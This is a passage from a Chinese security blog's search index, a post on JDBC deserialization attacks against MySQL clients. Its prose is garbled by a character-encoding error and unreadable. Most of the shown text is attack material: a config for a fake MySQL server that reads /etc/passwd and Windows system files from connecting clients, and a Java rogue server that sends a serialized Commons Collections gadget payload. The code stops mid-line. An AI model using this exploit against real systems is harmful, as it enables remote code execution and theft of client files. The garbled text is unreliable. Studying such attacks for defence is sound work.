<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JDBC Attackæ¼«è°ˆ</title>
      <link href="/2024/12/01/jdbc-attack/"/>
      <url>/2024/12/01/jdbc-attack/</url>
      
        <content type="html"><![CDATA[<p>20å¹´å¼€å§‹å°±å¾ˆå¤šå¤ç°äº†ï¼Œç°åœ¨æ‰èµ¶æ¥å­¦ä¹ ğŸ˜‚</p><p>è®®é¢˜æœ€å¼€å§‹åœ¨ BlackHat Europe 2019 ä¸Šç”± Back2Zero å›¢é˜Ÿç»™å‡ºæ¼”è®²ï¼Œååœ¨æ¬§æ´²é¡¶çº§ä¿¡æ¯å®‰å…¨ä¼šè®® HITB SECCONF SIN-2021 ä¸Šç”± Litch1 &amp; pyn3rd è¿›è¡Œäº†æ‹“å±•å’Œå»¶ä¼¸ã€‚</p><p>HACK IN THE BOXï¼ˆHITBï¼‰ä½œä¸ºå›½é™…å…¬è®¤çš„æœ€å…·å½±å“åŠ›çš„ä¿¡æ¯å®‰å…¨ä¼šè®®ï¼Œç›®å‰å·²æˆä¸ºå…¨çƒåå¤§å®‰å…¨å³°ä¼šä¹‹ä¸€ï¼Œæ¼”è®²è®®é¢˜å½•ç”¨æ¯”ä¾‹ä½äº10%</p><p>ä»¥ä¸‹ä¸ºä¸¤æ¬¡åˆ†äº«çš„ PPT åœ°å€ï¼š</p><p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf</a></p><p>[<a href="https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf]">https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf]</a>(<a href="https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2">https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2</a> - Make JDBC Attacks Brilliant Again - Xu Yuanzhen &amp; Chen Hongkun.pdf)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126215912065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126215912065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126215912065"></p><h1 id="JAVA-JDBC"><a href="#JAVA-JDBC" class="headerlink" title="JAVA JDBC"></a>JAVA JDBC</h1><p>ç®€ä»‹ï¼šJDBC(Java Database Connectivity)æ˜¯Javaæä¾›å¯¹æ•°æ®åº“è¿›è¡Œè¿æ¥ã€æ“ä½œçš„æ ‡å‡†APIã€‚Javaè‡ªèº«å¹¶ä¸ä¼šå»å®ç°å¯¹æ•°æ®åº“çš„è¿æ¥ã€æŸ¥è¯¢ã€æ›´æ–°ç­‰æ“ä½œè€Œæ˜¯é€šè¿‡æŠ½è±¡å‡ºæ•°æ®åº“æ“ä½œçš„APIæ¥å£(JDBC)</p><p>JDBC Connectionï¼šJDBCå®šä¹‰äº†ä¸€ä¸ªå«<code>java.sql.Driver</code>çš„æ¥å£ç±»è´Ÿè´£å®ç°å¯¹æ•°æ®åº“çš„è¿æ¥ï¼Œæ‰€æœ‰çš„æ•°æ®åº“é©±åŠ¨åŒ…éƒ½å¿…é¡»å®ç°è¿™ä¸ªæ¥å£æ‰èƒ½å¤Ÿå®Œæˆæ•°æ®åº“çš„è¿æ¥æ“ä½œã€‚<code>java.sql.DriverManager.getConnection(xxx)</code>å…¶å®å°±æ˜¯é—´æ¥çš„è°ƒç”¨äº†<code>java.sql.Driver</code>ç±»çš„<code>connect</code>æ–¹æ³•å®ç°æ•°æ®åº“è¿æ¥çš„ã€‚æ•°æ®åº“è¿æ¥æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªå«åš<code>java.sql.Connection</code>çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œä¸€åˆ‡å¯¹æ•°æ®åº“çš„æŸ¥è¯¢æ“ä½œéƒ½å°†ä¾èµ–äºè¿™ä¸ª<code>Connection</code>å¯¹è±¡ã€‚</p><p>è¿æ¥çš„æ ¼å¼å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:driver://host:port/database?setting1=value1&amp;setting2=value2</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥JDBCæ”»å‡»æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨è¿›è¡Œæ•°æ®åº“è¿æ¥çš„æ—¶å€™ä¼šæŒ‡å®šæ•°æ®åº“çš„URLå’Œè¿æ¥é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>,<span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¦‚æœJDBC URLçš„å‚æ•°è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå¯ä»¥è®©å…¶æŒ‡å‘æ¶æ„SQLæœåŠ¡å™¨</p><p>ä¸åŒçš„SQLæœåŠ¡å™¨å¯¹åº”JAVAä¸­çš„Impl APIä¸åŒï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image"></p><h2 id="Mysql-JDBC-Attack"><a href="#Mysql-JDBC-Attack" class="headerlink" title="Mysql JDBC Attack"></a>Mysql JDBC Attack</h2><p>JDBCè¿æ¥MySQLæœåŠ¡å™¨æ—¶ï¼Œä¼šé»˜è®¤æ‰§è¡Œå‡ ä¸ªå†…ç½®çš„SQLè¯­å¥ï¼ŒæŸ¥è¯¢çš„ç»“æœé›†ä¼šåœ¨Mysqlå®¢æˆ·ç«¯è°ƒç”¨ObjectInputStream#readObjectè¿›è¡Œååºåˆ—åŒ–ã€‚å…¶ä¸­åŸå› ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæ•°æ®éƒ½æ˜¯åºåˆ—åŒ–ä¼ è¾“çš„</p><p>æ”»å‡»è€…å¯ä»¥æ­å»ºæ¶æ„MysqlæœåŠ¡å™¨ï¼Œè¿”å›ç²¾å¿ƒæ„é€ çš„ç»“æœé›†ï¼Œå¯¹Mysqlå®¢æˆ·ç«¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è°ƒè¯•æ‰€éœ€çš„maven pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ‰“çš„æ˜¯CCé“¾ï¼Œæ‰€ä»¥åŠ çš„ä¾èµ–è¿›è¡Œæµ‹è¯•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¶æ„MysqlæœåŠ¡å™¨æ­å»ºï¼š</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>ä¿®æ”¹config.jsonï¼Œæ³¨æ„è¯¥mysqlä¼šç”¨ysoç”Ÿæˆgadgetï¼Œæ ¹æ®æ³¨é‡Šä¿®æ”¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ysoserialPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span><span class="punctuation">,</span> <span class="comment">//YsoSerialä½ç½®</span></span><br><span class="line">        <span class="attr">&quot;javaBinPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span><span class="comment">//javaè¿è¡Œå‘½ä»¤ä½ç½®</span></span><br><span class="line">        <span class="attr">&quot;fileOutputDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;./fileOutput/&quot;</span><span class="punctuation">,</span><span class="comment">//è¯»å–æ–‡ä»¶çš„ä¿å­˜ç›®å½•</span></span><br><span class="line">        <span class="attr">&quot;displayFileContentOnScreen&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//æ˜¯å¦è¾“å‡ºæ–‡ä»¶å†…å®¹é¢„è§ˆåˆ°æ§åˆ¶å°</span></span><br><span class="line">        <span class="attr">&quot;saveToFile&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="comment">//æ˜¯å¦ä¿å­˜æ–‡ä»¶</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//æ–‡ä»¶è¯»å–å‚æ•°</span></span><br><span class="line">    <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span><span class="comment">//keyä¸ºè®¾å®šçš„ç”¨æˆ·å,valueä¸ºè¦è¯»å–çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index_php&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__defaultFiles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">]</span><span class="comment">//æœªçŸ¥ç”¨æˆ·åæƒ…å†µä¸‹éšæœºé€‰æ‹©æ–‡ä»¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//ysoserialå‚æ•°</span></span><br><span class="line">    <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Jdk7u21&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;Jdk7u21&quot;</span><span class="punctuation">,</span><span class="string">&quot;calc&quot;</span><span class="punctuation">]</span><span class="comment">//keyä¸ºè®¾å®šçš„ç”¨æˆ·å,valueä¸ºysoserialå‚æ•°çš„å‚æ•°</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š<code>AttributeError: module &#39;asyncio&#39; has no attribute &#39;coroutine&#39;. Did you mean: &#39;coroutines&#39;?</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127183729919.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127183729919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127183729919"></p><p>åŒ…å«<code>@asyncio.coroutine</code> è£…é¥°å™¨çš„å°†ä»<strong>Python3.11</strong>ä¸­åˆ é™¤ï¼Œå› æ­¤**<code>asyncio</code>** æ¨¡å—æ²¡æœ‰<code>@asyncio.coroutine</code> è£…é¥°ç¬¦</p><p>æ”¹ä»£ç çš„è¯æ¯”è¾ƒéº»çƒ¦ï¼Œå»ºè®®å¼€ä¸ª3.0-3.10çš„pythonè™šæ‹Ÿæœºï¼Œæˆ–è€…è‡ªå·±å†™ä¸ªmysql server</p><p>ç”±äºæˆ‘æ²¡æœ‰ç”¨ysoçš„éœ€æ±‚ï¼Œæ‰€ä»¥å†™ä¸ªmysqlæœåŠ¡å™¨ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œfnmsdå¸ˆå‚…å¯¹JDBCè¿æ¥è¿‡ç¨‹ä¸­çš„å…¨éƒ¨TCPè¿›è¡ŒæŠ“åŒ…ï¼Œåˆ†æäº†å®¢æˆ·ç«¯ä¸mysqlæœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„å…¨éƒ¨æµç¨‹ï¼Œç„¶åé‡ç°æ•´ä¸ªäº¤äº’æµç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC_Attack_server</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GREETING_DATA</span> <span class="operator">=</span> <span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RESPONSE_OK_DATA</span> <span class="operator">=</span> <span class="string">&quot;0700000200000002000000&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PAYLOAD_FILE</span> <span class="operator">=</span> <span class="string">&quot;cc6.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port, <span class="number">50</span>, InetAddress.getByName(host))) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Start fake MySQL server listening on &quot;</span> + host + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">clientSocket</span> <span class="operator">=</span> serverSocket.accept()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Connection come from &quot;</span> + clientSocket.getInetAddress() + <span class="string">&quot;:&quot;</span> + clientSocket.getPort());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Send greeting data</span></span><br><span class="line">                    sendData(clientSocket, GREETING_DATA);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="comment">// Login simulation: Client sends request login, server responds with OK</span></span><br><span class="line">                        receiveData(clientSocket);</span><br><span class="line">                        sendData(clientSocket, RESPONSE_OK_DATA);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Other processes</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> receiveData(clientSocket);</span><br><span class="line">                        <span class="keyword">if</span> (data.contains(<span class="string">&quot;session.auto_increment_increment&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&quot;</span>;</span><br><span class="line">                            sendData(clientSocket, payload);</span><br><span class="line">                            data = receiveData(clientSocket);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&quot;</span>;</span><br><span class="line">                            sendData(clientSocket, payload);</span><br><span class="line">                            data = receiveData(clientSocket);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (data.contains(<span class="string">&quot;SET NAMES&quot;</span>)) &#123;</span><br><span class="line">                            sendData(clientSocket, RESPONSE_OK_DATA);</span><br><span class="line">                            data = receiveData(clientSocket);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (data.contains(<span class="string">&quot;SET character_set_results&quot;</span>)) &#123;</span><br><span class="line">                            sendData(clientSocket, RESPONSE_OK_DATA);</span><br><span class="line">                            data = receiveData(clientSocket);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (data.contains(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">StringBuilder</span> <span class="variable">mysqlDatafinal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">mysqlData</span> <span class="operator">=</span> <span class="string">&quot;0100000102&quot;</span>;</span><br><span class="line">                            mysqlData += <span class="string">&quot;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&quot;</span>;</span><br><span class="line">                            mysqlData += <span class="string">&quot;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// Get payload</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">payloadContent</span> <span class="operator">=</span> getPayloadContent();</span><br><span class="line">                            <span class="keyword">if</span> (payloadContent != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="comment">// è®¡ç®— payload é•¿åº¦å¹¶è½¬ä¸ºåå…­è¿›åˆ¶æ ¼å¼</span></span><br><span class="line">                                <span class="type">String</span> <span class="variable">payloadLength</span> <span class="operator">=</span> Integer.toHexString(payloadContent.length() / <span class="number">2</span>); <span class="comment">// Pythonä¸­çš„ //2 åœ¨Javaä¸­æ˜¯ä½¿ç”¨é™¤æ³•</span></span><br><span class="line">                                payloadLength = String.format(<span class="string">&quot;%4s&quot;</span>, payloadLength).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>);  <span class="comment">// è¡¥å……0ï¼Œä¿æŒå››ä½é•¿åº¦</span></span><br><span class="line">                                <span class="type">String</span> <span class="variable">payloadLengthHex</span> <span class="operator">=</span> payloadLength.substring(<span class="number">2</span>, <span class="number">4</span>) + payloadLength.substring(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// åè½¬é¡ºåº</span></span><br><span class="line"></span><br><span class="line">                                <span class="comment">// è®¡ç®—æ•°æ®åŒ…æ€»é•¿åº¦</span></span><br><span class="line">                                <span class="type">int</span> <span class="variable">totalLength</span> <span class="operator">=</span> payloadContent.length() / <span class="number">2</span> + <span class="number">4</span>;</span><br><span class="line">                                <span class="type">String</span> <span class="variable">dataLen</span> <span class="operator">=</span> Integer.toHexString(totalLength);</span><br><span class="line">                                dataLen = String.format(<span class="string">&quot;%6s&quot;</span>, dataLen).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>); <span class="comment">// è¡¥å……0ï¼Œä¿æŒå…­ä½é•¿åº¦</span></span><br><span class="line">                                <span class="type">String</span> <span class="variable">dataLenHex</span> <span class="operator">=</span> dataLen.substring(<span class="number">4</span>, <span class="number">6</span>) + dataLen.substring(<span class="number">2</span>, <span class="number">4</span>) + dataLen.substring(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// åè½¬é¡ºåº</span></span><br><span class="line"></span><br><span class="line">                                <span class="comment">// æ„é€ æœ€ç»ˆçš„ MySQL æ•°æ®åŒ…</span></span><br><span class="line">                                mysqlDatafinal.append(mysqlData).append(dataLenHex)</span><br><span class="line">                                        .append(<span class="string">&quot;04&quot;</span>)</span><br><span class="line">                                        .append(<span class="string">&quot;fbfc&quot;</span>)</span><br><span class="line">                                        .append(payloadLengthHex)</span><br><span class="line">                                        .append(payloadContent)  <span class="comment">// è¿™é‡Œåº”è¯¥æ˜¯ payload çš„å†…å®¹ï¼Œå‡è®¾å®ƒæ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">                                        .append(<span class="string">&quot;07000005fe000022000100&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">mysqlstring</span> <span class="operator">=</span> 